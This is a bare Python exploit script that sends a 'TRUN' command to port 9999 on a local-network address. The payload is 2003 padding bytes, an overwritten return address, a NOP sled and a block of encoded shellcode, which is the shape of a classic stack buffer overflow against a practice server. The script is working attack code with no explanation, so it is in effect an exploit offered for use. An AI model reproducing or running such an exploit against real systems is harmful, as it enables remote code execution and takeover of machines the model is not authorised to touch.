#!/usr/bin/python
import socket

# \x00

overflow = ("\xbd\xf4\x96\x40\x53\xd9\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x9c\x98\xa2\xa6\xa0\x4d\xa0"
"\x49\x58\x8e\xc5\xc0\xbd\xbf\xc5\xb7\xb6\x90\xf5\xbc\x9a\x1c"
"\x7d\x90\x0e\x96\xf3\x3d\x21\x1f\xb9\x1b\x0c\xa0\x92\x58\x0f"
"\x22\xe9\x8c\xef\x1b\x22\xc1\xee\x5c\x5f\x28\xa2\x35\x2b\x9f"
"\x52\x31\x61\x1c\xd9\x09\x67\x24\x3e\xd9\x86\x05\x91\x51\xd1"
"\x85\x10\xb5\x69\x8c\x0a\xda\x54\x46\xa1\x28\x22\x59\x63\x61"
"\xcb\xf6\x4a\x4d\x3e\x06\x8b\x6a\xa1\x7d\xe5\x88\x5c\x86\x32"
"\xf2\xba\x03\xa0\x54\x48\xb3\x0c\x64\x9d\x22\xc7\x6a\x6a\x20"
"\x8f\x6e\x6d\xe5\xa4\x8b\xe6\x08\x6a\x1a\xbc\x2e\xae\x46\x66"
"\x4e\xf7\x22\xc9\x6f\xe7\x8c\xb6\xd5\x6c\x20\xa2\x67\x2f\x2d"
"\x07\x4a\xcf\xad\x0f\xdd\xbc\x9f\x90\x75\x2a\xac\x59\x50\xad"
"\xd3\x73\x24\x21\x2a\x7c\x55\x68\xe9\x28\x05\x02\xd8\x50\xce"
"\xd2\xe5\x84\x41\x82\x49\x77\x22\x72\x2a\x27\xca\x98\xa5\x18"
"\xea\xa3\x6f\x31\x81\x5e\xf8\xfe\xfe\x61\xf5\x96\xfc\x61\x14"
"\x3b\x88\x87\x7c\xd3\xdc\x10\xe9\x4a\x45\xea\x88\x93\x53\x97"
"\x8b\x18\x50\x68\x45\xe9\x1d\x7a\x32\x19\x68\x20\x95\x26\x46"
"\x4c\x79\xb4\x0d\x8c\xf4\xa5\x99\xdb\x51\x1b\xd0\x89\x4f\x02"
"\x4a\xaf\x8d\xd2\xb5\x6b\x4a\x27\x3b\x72\x1f\x13\x1f\x64\xd9"
"\x9c\x1b\xd0\xb5\xca\xf5\x8e\x73\xa5\xb7\x78\x2a\x1a\x1e\xec"
"\xab\x50\xa1\x6a\xb4\xbc\x57\x92\x05\x69\x2e\xad\xaa\xfd\xa6"
"\xd6\xd6\x9d\x49\x0d\x53\xbd\xab\x87\xae\x56\x72\x42\x13\x3b"
"\x85\xb9\x50\x42\x06\x4b\x29\xb1\x16\x3e\x2c\xfd\x90\xd3\x5c"
"\x6e\x75\xd3\xf3\x8f\x5c")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.14",9999))
s.recv(1024)
s.send("TRUN /.:/" + shellcode)
